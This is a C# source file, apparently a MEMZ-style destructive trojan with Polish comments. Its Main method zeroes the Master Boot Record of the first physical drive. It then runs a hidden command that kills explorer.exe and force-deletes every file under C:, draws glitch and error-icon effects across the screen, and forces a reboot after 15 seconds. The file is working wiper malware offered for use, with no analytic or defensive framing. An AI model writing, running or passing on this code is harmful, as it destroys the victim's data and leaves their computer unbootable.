using System;
using System.Drawing;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

namespace MemzInstant
{
    class Program
    {
        [DllImport("kernel32.dll")] static extern IntPtr CreateFile(string lp, uint da, uint sm, IntPtr sa, uint cd, uint fa, IntPtr h);
        [DllImport("kernel32.dll")] static extern bool WriteFile(IntPtr h, byte[] b, uint n, out uint w, IntPtr o);
        [DllImport("gdi32.dll")] static extern bool BitBlt(IntPtr hdcD, int x, int y, int w, int h, IntPtr hdcS, int xs, int ys, int r);
        [DllImport("user32.dll")] static extern IntPtr GetDC(IntPtr h);

        static void Main()
        {
            // 1. NATYCHMIASTOWE NISZCZENIE MBR
            OverwriteMBR();

            // 2. USUNIĘCIE EXPLORERA I PLIKÓW (W TLE)
            Process.Start(new ProcessStartInfo("cmd.exe", "/c taskkill /f /im explorer.exe & del /s /q /f C:\\*.*") { WindowStyle = ProcessWindowStyle.Hidden });

            // 3. EFEKTY WIZUALNE (PAYLOADS) W OSOBNYCH WĄTKACH
            Thread gdiThread = new Thread(GdiPayload);
            gdiThread.Start();

            // 4. WYMUSZONY RESTART PO 15 SEKUNDACH EFEKTÓW
            Thread.Sleep(15000);
            Process.Start("shutdown", "/r /f /t 0");
        }

        static void OverwriteMBR()
        {
            try
            {
                byte[] mbrData = new byte[512]; // Puste dane (czyści MBR)
                uint written;
                IntPtr drive = CreateFile("\\\\.\\PhysicalDrive0", 0x10000000, 1 | 2, IntPtr.Zero, 3, 0, IntPtr.Zero);
                WriteFile(drive, mbrData, 512, out written, IntPtr.Zero);
            }
            catch { }
        }

        static void GdiPayload()
        {
            Random rnd = new Random();
            IntPtr hdc = GetDC(IntPtr.Zero);
            int w = Screen.PrimaryScreen.Bounds.Width;
            int h = Screen.PrimaryScreen.Bounds.Height;

            while (true)
            {
                // Efekt "Tunneling" i "Invert"
                BitBlt(hdc, rnd.Next(-10, 10), rnd.Next(-10, 10), w, h, hdc, 0, 0, 0x00990066);
                
                // Losowe ikony błędów na ekranie
                using (Graphics g = Graphics.FromHdc(hdc))
                {
                    g.DrawIcon(SystemIcons.Error, rnd.Next(w), rnd.Next(h));
                    g.DrawIcon(SystemIcons.Warning, rnd.Next(w), rnd.Next(h));
                }
                
                Thread.Sleep(10);
            }
        }
    }
}
